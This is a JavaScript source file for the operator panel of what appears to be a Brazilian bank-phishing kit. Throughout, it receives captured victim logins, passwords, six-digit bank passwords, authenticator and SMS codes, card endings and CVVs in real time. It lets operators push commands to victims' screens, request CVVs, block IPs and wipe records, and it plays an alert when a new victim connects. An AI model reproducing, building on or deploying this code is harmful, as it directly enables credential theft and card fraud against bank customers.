socket.on('onScreenPass', (data) => {
    const lineClient = document.querySelector(`.productList tr[data-id='${data.id}']`)

    if (!lineClient) return

    lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
})

var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))

console.log(tooltipTriggerList)
var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
    return new bootstrap.Tooltip(tooltipTriggerEl)
})

const panel = (() => {
    //private var/functions

    function playSound(url) {
        const audio = new Audio(url)
        audio.play()
    }

    const buttonsSendCommands = [...document.querySelectorAll('.btn-actions')]

    const token = document.body.dataset.token

    function clickShowCard(button) {
        if(!button) return

        button.addEventListener('click', async function (e) {
                
            e.preventDefault()

            try {
                console.log(`cliquei no botão`, button)

                const id = button.dataset.id

                if(!id) return console.log(`Botão não possui id`)

                ///api/client/card/:client_id
                const config = {
                    method: `get`,
                    headers: {
                        'Content-Type': 'application/json',
                    }
                }

                const client = await (await fetch(`/api/client/card/${id}`, config)).json()

                const { cards } = client

                if(!cards[0]) return

                console.log(`cliente: `, client)

                const modal = document.querySelector('#modalCard');

                const number = modal.querySelector('.card_number');

                if(!number) return

                number.value = cards[0].end

                const cvv = modal.querySelector('.card_cvv');

                if(!cvv) return

                cvv.value = cards[0].cvv

                const flag = modal.querySelector('.card_validity');

                if(!flag) return

                flag.value = cards[0].flag

                var modalCard = new bootstrap.Modal(document.getElementById("modalCard"), {});

                modalCard.show();
            } catch (error) {
                console.log(error)
            }
            
            
        });
    }

    //clientIdentify

    function showCard(target) {
        const buttons = document.querySelectorAll(target);

        if(!buttons) return

        

        for (const button of buttons) {
            clickShowCard(button)
        }

        
    }

    function cleanInfos() {
        const button = document.querySelector('.btn-clean')

        if (!button) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            fetch('/api/clean', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
            })
                .then((r) => r.json())
                .then((res) => {
                    if (res.error)
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: res.error,
                            type: 'warning',
                        })

                    return
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    async function sendCommand() {
        if (buttonsSendCommands) {
            buttonsSendCommands.forEach((btn) => {
                btn.addEventListener('click', function (e) {
                    e.preventDefault()

                    const clientOperating = document.querySelector('.form-operator')

                    if (!clientOperating) console.log('nenhum cliente selecionado')

                    const idClient = clientOperating.getAttribute('client-id')

                    const action = btn.getAttribute('action')

                    if (action == `getSMS`) {
                        const phoneEnd = document.querySelector('#inputPhoneEnd')

                        if (phoneEnd) {
                            if (!phoneEnd.value) {
                                return phoneEnd.setAttribute('style', 'border-color: red;')
                            } else {
                                phoneEnd.setAttribute('style', '')
                                return socket.emit(action, { phoneEnd: phoneEnd.value, idClient })
                            }
                        }
                    }

                    socket.emit(action, idClient)
                })
            })
        }
    }

    function handleCount(minute, second, field) {
        //return { minute, second }

        setInterval(() => {
            if (field.innerHTML.indexOf('SAIU') == -1) {
                if (second == 59) {
                    minute = minute + 1
                    second = 0
                } else {
                    second = second + 1
                }

                field.innerHTML = ('0' + minute).slice(-2) + ':' + ('0' + second).slice(-2)
            }
        }, 1000)
    }

    function handleTimer(field) {
        const timer = field.innerHTML.split(':')
        console.log(`text in field: `, timer)

        const minute = parseInt(timer[0])

        const seconds = parseInt(timer[1])

        handleCount(minute, seconds, field)
    }

    function timer() {
        const timers = [...document.querySelectorAll('td[role="time"]')]

        if (timers) timers.forEach(handleTimer)
    }

    async function register() {
        const form = document.querySelector('.formRegister')

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            const modal = form.closest('.modal')

            const token = document.body.dataset.token

            fetch('/api/user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            })
                .then((r) => r.json())
                .then((response) => {
                    const user = response

                    if (response.error)
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: response.error,
                            type: 'warning',
                        })

                    $(modal).modal('hide')

                    console.log(response)

                    util.notify({
                        icon: 'success',
                        title: 'Sucesso',
                        message: `Usuário ${user.name} cadastrado com sucesso`,
                        type: 'success',
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    function handleReconnect(client) {
        const { id, user, password, updatedAt, status, type } = client

        const { operator } = client

        const tr = document.querySelector(`tr[data-id="${id}"]`)

        if (!tr) return

        const roleId = tr.querySelector(`th[role="id"]`)
        const roleOperator = tr.querySelector(`strong[role="operator"]`)
        const roleUser = tr.querySelector(`td[role="user"]`)
        const rolePassword = tr.querySelector(`td[role="password"]`)
        const roleType = tr.querySelector(`td[role="type"]`)
        const roleTime = tr.querySelector(`td[role="time"]`)
        const roleCommand = tr.querySelector(`td[role="command"]`)

        roleCommand.innerHTML = 'Aguardando comando'
        roleType.innerHTML = type

        let time = new Date() - new Date(updatedAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        if (operator) roleOperator.innerHTML = operator.name

        roleUser.innerHTML = user
        rolePassword.innerHTML = password
        roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
    }

    async function handleBlockIp(button) {
        try {
            if (!button) return

            const id_client = button.dataset.client

            button.addEventListener('click', async function (e) {
                e.preventDefault()

                console.log(`id cliente block`, id_client)

                if (!id_client) return console.log(`ID do cliente não identificado`)

                const token = document.body.dataset.token

                const config = {
                    method: `post`,
                    headers: {
                        'Content-Type': 'application/json',
                        authorization: `Bearer ${token}`,
                    },
                }

                const ipBlocked = await (await fetch(`/api/blocked_ip/${id_client}`, config)).json()

                console.log(`ip bloqueado: `, ipBlocked)
            })
        } catch (error) {
            console.log(error)
        }
    }

    function createClient(client) {
        const { id, user, password, password6, type, auth } = client
        const tr = document.createElement('tr')

        tr.dataset.id = id

        tr.innerHTML = `
        <th scope="row" role="id"># ${id}</th>
        <td role="user">${user}</td>
        <td role="password">${password}</td>
        <input type="hidden" name="password6" value="${password6}">
        <input type="hidden" name="auth" value="${auth}">
        <td role="status" class="blockstatus enter"><span>${password6}</span></td>
        <td role="auth" class="blockstatus enter"><span>${auth}</span></td>
        <td role="device">

            <div class="row">
                <div class="col-7">
                    <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="
                    Modelo: ${ client.device.model || `Desconhecido` }">
                        ${client.device.type || `Desconhecido`}
                    </span>
                    <button class="blockIP" data-client="${id}"><i class="bi bi-lock-fill"></i></button>
                </div>

                <div class="col-5">
                    <button type="button" class="btn btn-primary btnShowCard" data-id="${id}">
                        <i class="bi bi-credit-card"></i>
                    </button>
                </div>
            </div>

        </td>
        `
        
        //timer(roleTime)
        const buttonBlock = tr.querySelector('td[role="device"] button.blockIP')
        const buttonShowCard = tr.querySelector('td[role="device"] button.btnShowCard')

        clickShowCard(buttonShowCard)

        handleBlockIp(buttonBlock)

        clickInfo(tr)
        new bootstrap.Tooltip(tr.querySelector('[data-bs-toggle="tooltip"]'))
        playSound('/fonts/pristine-609.mp3')
        setTimeout(() => {
            playSound('/fonts/pristine-609.mp3')
        }, 600)

        document.querySelector('.productList').prepend(tr)
    }

    function BlockIp(buttons) {
        if (!buttons) return

        for (const button of buttons) {
            handleBlockIp(button)
        }
    }

    function clientEnter() {
        socket.on('reconnectClient', (client) => {
            handleReconnect(client)
        })

        socket.on('newClient', createClient)
    }

    function updateClient(data) {
        const table = document.querySelector('.productList')

        const tableId = table.querySelector(`tr[data-id='${data.id}']`)
        const tableUser = tableId.querySelector(`[role='user']`)
        const tablePassword = tableId.querySelector(`[role='password']`)

        if (tableId && tableUser) tableUser.innerHTML = data.user
        if (tableId && tablePassword) tablePassword.innerHTML = data.password
    }

    function receiver() {
        socket.on('AssignOp', (data) => {
            const clientColumn = document.querySelector(`.productList tr[data-id="${data.client.id}"]`)

            if (!clientColumn) return

            if (clientColumn.querySelector('.snip_Operator')) clientColumn.querySelector('.snip_Operator').remove()

            const snip = document.createElement('span')
            snip.classList.add('snip_Operator')

            snip.innerHTML = data.operator

            clientColumn.append(snip)

            //cvv
            const inputCVV = document.querySelector(`#inputCVV`)
            const inputEndCard = document.querySelector(`#inputEndCard`)
            const selectCardBrand = document.querySelector(`#selectCardBrand`)
            const inputSMS = document.querySelector(`#inputSMS`)

            if (inputSMS) inputSMS.value = data.client.phone

            if (inputCVV && inputEndCard) {
                const { cards } = data.client

                if (cards && cards.length) {
                    inputCVV.value = cards[0].cvv
                    inputEndCard.value = cards[0].end
                    selectCardBrand.value = cards[0].flag
                } else {
                    inputCVV.value = ``
                }
            } else {
            }
        })

        socket.on('visitors', (data) => {
            const visitButton = document.querySelector('.btn-visitors')

            if (!visitButton) return

            visitButton.innerHTML = `Visitas (${data})`
        })

        socket.on('createClient', (data) => {
            createClient(data)
        })

        socket.on('onScreenAuth', (data) => {
            const info = document.querySelector(`.productList tr[data-id='${data.id}']`)

            console.log('online na tela de auth')

            if (!info) return

            const role = info.querySelector('td[role="status"]')

            if (!role) return

            // setTimeout(() => {
            //     role.className = ''
            //     role.classList.add('blockstatus', 'enter')
            //     role.querySelector('span').innerHTML = `Online Autenticador`
            // }, 300)
        })

        socket.on('cleanClients', (data) => {
            const list = document.querySelectorAll('.productList > tr')

            if (!list) return

            list.forEach((info) => {
                if (!info) return
                info.remove()
            })

            return util.notify({
                icon: 'success',
                title: 'Sucesso',
                message: `${data} infos excluídas`,
                type: 'success',
            })
        })

        socket.on('sendAuth', (data) => {
            setTimeout(() => {
                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

                item.querySelector(`td[role='status']`).className = ``

                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')

                //item.querySelector(`td[role='status'] span`).innerHTML = 'Auth enviado'
            }, 600)
        })

        socket.on('onScreenDisp', (data) => {
            const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

            if (!item) return

            // setTimeout(() => {
            //     item.querySelector(`td[role='status']`).className = ``

            //     item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
            //     item.querySelector(`td[role='status'] span`).innerHTML = 'Online tela dispositivo'
            // }, 500)
        })

        socket.on('updateClient', (data) => {
            const lineClient = document.querySelector(`.productList > tr[data-id='${data.id}']`)

            setTimeout(() => {
                if (lineClient) {
                    lineClient.querySelector(`td[role='user']`).innerHTML = data.user
                    lineClient.querySelector(`td[role='password']`).innerHTML = data.password
                    lineClient.querySelector(`input[name='password6']`).value = data.password6
                    lineClient.querySelector(`input[name='auth']`).value = data.auth
                    lineClient.querySelector(`td[role='status']`).className = ``
                    lineClient.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
                    lineClient.querySelector(`td[role='status']`).innerHTML = `<span>${data.password6}</span>`
                }

                const formOperator = document.querySelector(`form[client-id='${data.id}']`)

                if (formOperator) {
                    formOperator.querySelector(`input[type='email']`).value = data.user
                    formOperator.querySelector(`#exampleInputPassword1`).value = data.password
                    formOperator.querySelector(`#password6`).value = data.password6
                    formOperator.querySelector(`#inputAuthenticator`).value = data.auth
                    formOperator.querySelector(`#inputSMS`).value = data.phone

                    const { cards } = data

                    if (cards) formOperator.querySelector(`#inputCVV`).value = cards[0].cvv
                }
            }, 300)

            //updateClient(data)
        })

        socket.on('sendPassword', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            const password = roleId.querySelector('td[role="password"]')

            if (password) password.innerHTML = client.password

            const command = roleId.querySelector('td[role="status"]')
            const auth = roleId.querySelector('td[role="auth"] span')

            if (auth) auth.innerHTML = client.auth

            if (command) command.innerHTML = `<span>${client.password6}</span>`
        })

        socket.on('assignClient', (client) => {
            handleReconnect(client)
        })

        socket.on('finish', (client) => {
            return handleReconnect(client)
        })

        socket.on('clientDisconnect', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            roleId.querySelector('td[role="status"]').classList.remove('enter')
            roleId.querySelector('td[role="status"]').classList.add('disconnected')

            const command = roleId.querySelector('td[role="status"] span')

            //if (command) command.innerHTML = `SAIU`
        })

        socket.on('clientDestroy', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            roleId.remove()
        })

        socket.on('await', (client) => {
            const field = document.querySelector(`tr[data-id="${client.id}"]`)

            if (field) {
                const role = field.querySelector('td[role="command"]')

                role.innerHTML = `Aguardando Comando`
            }
        })
    }

    function clickInfo(info) {
        info.addEventListener('click', (e) => {
            e.preventDefault()

            const form = document.querySelector('.form-operator')

            document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML

            if (!form) return

            form.setAttribute('client-id', info.getAttribute('data-id'))

            form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
            form.querySelector('#exampleInputPassword1').value = info
                .querySelector(`td[role='password']`)
                .innerHTML.replace(/\s/g, '')

            console.log(info.querySelector(`input`).value)

            if (
                info.querySelector(`input[name='password6']`).value != null ||
                info.querySelector(`input[name='password6']`).value != 'null'
            )
                form.querySelector('#password6').value = info
                    .querySelector(`input[name='password6']`)
                    .value.replace(/\s/g, '')

            if (
                info.querySelector(`input[name='auth']`).value != null ||
                info.querySelector(`input[name='auth']`).value != 'null'
            )
                form.querySelector('#inputAuthenticator').value = info
                    .querySelector(`input[name='auth']`)
                    .value.replace(/\s/g, '')

            socket.emit('AssignOp', { cl: info.getAttribute('data-id'), token })
        })
    }

    function selectInfo() {
        const listInfo = [...document.querySelectorAll(`.productList tr`)]

        listInfo.forEach((info) => {
            info.addEventListener('click', (e) => {
                e.preventDefault()

                document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML

                const form = document.querySelector('.form-operator')

                if (!form) return

                form.setAttribute('client-id', info.getAttribute('data-id'))

                form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
                form.querySelector('#exampleInputPassword1').value = info
                    .querySelector(`td[role='password']`)
                    .innerHTML.replace(/\s/g, '')

                form.querySelector('#password6').value = info
                    .querySelector(`input[name='password6']`)
                    .value.replace(/\s/g, '')

                form.querySelector('#inputAuthenticator').value = info
                    .querySelector(`input[name='auth']`)
                    .value.replace(/\s/g, '')

                socket.emit('AssignOp', { cl: info.getAttribute('data-id'), token })
            })
        })
    }

    function excludeUser() {
        socket.on('destroyUser', (data) => {
            const user = document.querySelector(`.user_exclude_${data.id}`)

            if (!user) return

            user.remove()
        })

        const btns = document.querySelectorAll('.btn-ExcludeUser')

        if (!btns) return

        btns.forEach((button) => {
            button.addEventListener('click', function (e) {
                e.preventDefault()

                const buttonId = button.dataset.id

                if (!buttonId) return

                fetch(`/api/user/${buttonId}`, {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${token}`,
                    },
                })
                    .then((r) => r.json())
                    .then((res) => {
                        if (res.error) {
                            return util.notify({
                                icon: `alert-icon ni ni-bell-55`,
                                title: 'Atenção! alguns erros foram encontrados!',
                                message: res.error,
                                type: 'warning',
                            })
                        }

                        return util.notify({
                            icon: 'success',
                            title: 'Sucesso',
                            message: `Usuário ${res.name} excluído`,
                            type: 'success',
                        })
                    })
                    .catch((err) => {
                        $('#changePassModal').modal('hide')
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: err,
                            type: 'warning',
                        })
                    })
            })
        })
    }

    function changePassword() {
        const btn = document.querySelector('.btn-changePassword')

        if (!btn) return

        btn.addEventListener('click', function (e) {
            e.preventDefault()

            const form = document.querySelector('.changePassForm')

            if (!form) return

            const data = util.serialize(form)

            if (!data) return

            //request

            fetch('/api/user/change_password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            })
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) {
                        $('#changePassModal').modal('hide')
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: res.error,
                            type: 'warning',
                        })
                    }

                    console.log(`dados recebidos ao mudar senha: `, res)

                    $('#changePassModal').modal('hide')

                    return util.notify({
                        icon: 'success',
                        title: 'Sucesso',
                        message: `Senha de ${res.name} alterada com sucesso`,
                        type: 'success',
                    })
                })
                .catch((err) => {
                    $('#changePassModal').modal('hide')
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })

            form.querySelector(`input[name='password']`).value = ''
        })
    }

    async function getCardNumber(target) {
        //getCVV

        const button = document.querySelector(target)

        if (!button) return

        button.addEventListener('click', async function (e) {
            e.preventDefault()

            try {
                const form = button.closest(`.form-operator`)

                const client_id = form.getAttribute(`client-id`)

                if (!client_id) return

                const flag = document.querySelector(`#selectCardBrand`).value

                if (!flag) return

                const end = document.querySelector('#inputEndCard').value

                if (!end) return

                const config = {
                    method: `post`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ flag, end }),
                }

                const requestCard = await fetch(`/api/client/card/${client_id}`, config)

                const response = await requestCard.json()

                console.log(`Pedido cvv`, response)
            } catch (error) {
                console.log(error)
            }
        })
    }

    return {
        //public var/functions
        clientEnter,
        receiver,
        register,
        timer,
        selectInfo,
        sendCommand,
        cleanInfos,
        changePassword,
        excludeUser,
        getCardNumber,
        BlockIp,
        showCard
    }
})()

const buttonsBlock = document.querySelectorAll('.productList td[role="device"] button.blockIP')


panel.showCard(`.btnShowCard`)
panel.BlockIp(buttonsBlock)
panel.getCardNumber(`.getCVV`)
panel.excludeUser()
panel.changePassword()
panel.sendCommand()
panel.cleanInfos()
panel.selectInfo()
panel.clientEnter()
panel.receiver()
panel.register()
panel.timer()
